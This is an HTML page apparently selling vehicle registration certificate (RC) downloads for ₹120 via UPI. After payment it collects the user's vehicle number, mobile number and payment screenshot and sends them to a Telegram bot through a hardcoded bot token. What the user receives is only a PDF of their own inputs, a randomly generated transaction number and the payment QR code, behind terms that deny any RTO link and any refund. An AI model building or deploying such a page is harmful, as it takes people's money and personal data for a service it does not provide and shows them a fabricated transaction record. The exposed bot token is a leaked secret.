<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RCPDF.IN</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI}

body{
background:linear-gradient(-45deg,#ff0066,#005BAC,#00c6ff,#00ff99);
background-size:400% 400%;
animation:bg 8s infinite;
display:flex;flex-direction:column;align-items:center;
}
@keyframes bg{0%{background-position:0%}50%{background-position:100%}100%{background-position:0%}}

.topbar{
position:fixed;top:0;width:100%;
background:#fff;padding:10px;
display:flex;justify-content:space-between;
align-items:center;
}

.homeBtn{
background:#ff0066;color:#fff;
padding:5px 10px;font-size:13px;
border-radius:6px;
}

.menu-icon div{
width:22px;height:3px;background:#ff0066;margin:4px 0;
}

.sideMenu{
position:fixed;right:-260px;top:0;width:250px;height:100%;
background:#fff;padding-top:80px;transition:0.3s;
}
.sideMenu button{
width:90%;margin:10px 5%;padding:12px;
background:#ff0066;color:#fff;border:none;border-radius:8px;
}
.openMenu{right:0}

.card{
margin-top:100px;background:rgba(255,255,255,0.2);
padding:20px;border-radius:15px;width:90%;max-width:400px;text-align:center;
}

input{width:100%;padding:12px;margin-top:10px;border-radius:8px;border:none}

button{
width:100%;padding:12px;margin-top:10px;
background:#000;color:#fff;border:none;border-radius:8px;
box-shadow:0 5px 0 #333;
}
button:active{transform:translateY(3px);box-shadow:0 2px 0 #333}

.qr{width:200px;margin-top:10px}

.loader{
position:fixed;top:0;left:0;width:100%;height:100%;
background:#fff;display:none;
flex-direction:column;justify-content:center;align-items:center;
}
.barBox{width:80%;background:#ddd}
.bar{height:20px;background:#ff0066;width:0%}

.popup{
position:fixed;top:50%;left:50%;
transform:translate(-50%,-50%);
background:#fff;padding:20px;border-radius:10px;
display:none;
}
</style>
</head>

<body>

<div class="topbar">
<div class="menu-icon" onclick="menu.classList.toggle('openMenu')">
<div></div><div></div><div></div>
</div>

<button class="homeBtn" onclick="location.reload()">🏠</button>
</div>

<div class="sideMenu" id="menu">
<button onclick="window.location.href='https://insurancebju.blogspot.com'">Insurance</button>
<button>About</button>
<button>Disclaimer</button>
<button onclick="window.location.href='https://t.me/yourtelegramusername'">Contact</button>
</div>

<div class="card">

<div id="page1">
<input id="vehicle" placeholder="BR-09-AB-1234" oninput="formatVehicle(this)">
<button onclick="goNext()">Continue</button>
</div>

<div id="page2" style="display:none">
<button onclick="payUPI()">Pay ₹120 with UPI</button>

<img id="qrImg" class="qr"
src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=upi%3A%2F%2Fpay%3Fpa%3D8709610091%40okbizaxis%26am%3D120%26cu%3DINR">

<input id="mobile" placeholder="Mobile Number">
<input type="file" id="proof">

<button onclick="submitForm()">Submit</button>
</div>

</div>

<div class="loader" id="loader">
<div class="barBox"><div class="bar" id="bar"></div></div>
<div id="percent">0%</div>
</div>

<div class="popup" id="popup">
<h2>🎉 Done</h2>
<button onclick="location.reload()">OK</button>
</div>

<script>

function formatVehicle(i){
let v=i.value.replace(/[^A-Z0-9]/gi,'').toUpperCase();
if(v.length>2)v=v.slice(0,2)+"-"+v.slice(2);
if(v.length>5)v=v.slice(0,5)+"-"+v.slice(5);
if(v.length>8)v=v.slice(0,8)+"-"+v.slice(8,12);
i.value=v;
}

function goNext(){page1.style.display="none";page2.style.display="block";}
function payUPI(){window.location.href="upi://pay?pa=8709610091@okbizaxis&am=120&cu=INR";}

function downloadPDF(){

const { jsPDF } = window.jspdf;
let pdf = new jsPDF();

let d=new Date();
let txn="TXN"+Math.floor(Math.random()*999999);

pdf.rect(5,5,200,287);
pdf.rect(8,8,194,281);

function box(y,text){
pdf.setFillColor(200,255,200);
pdf.rect(15,y,180,12,"F");
pdf.rect(15,y,180,12);
pdf.text(text,20,y+8);
}

box(35,"Vehicle: "+vehicle.value);
box(50,"Mobile: "+mobile.value);
box(65,"Work: RC Download");
box(80,"Transaction: "+txn);

/* QR */
pdf.addImage(document.getElementById("qrImg").src,"PNG",55,120,100,100);

/* Hinglish T&C */
pdf.setFontSize(8);
let y=230;

pdf.text("• Yeh website RTO se judi nahi hai",10,y); y+=5;
pdf.text("• Jaankari ki guarantee nahi hai",10,y); y+=5;
pdf.text("• Sirf information ke liye hai",10,y); y+=5;
pdf.text("• Galat use ki jimmedari user ki hogi",10,y); y+=5;
pdf.text("• Payment ke baad refund nahi milega",10,y); y+=5;
pdf.text("• Payment = terms accept mana jayega",10,y);

pdf.save("RC.pdf");
}

function submitForm(){

loader.style.display="flex";

let p=0;
let i=setInterval(()=>{
p++;
bar.style.width=p+"%";
percent.innerText=p+"%";

if(p>=100){
clearInterval(i);

downloadPDF();

/* TELEGRAM FIX */
let data=new FormData();
data.append("chat_id","5600045707");
data.append("caption",
"Vehicle: "+vehicle.value+
"\nMobile: "+mobile.value+
"\nTime: "+new Date().toLocaleString()
);
data.append("photo",proof.files[0]);

fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto",
{method:"POST",body:data});

loader.style.display="none";
popup.style.display="block";
}
},30);
}

</script>

</body>
</html>
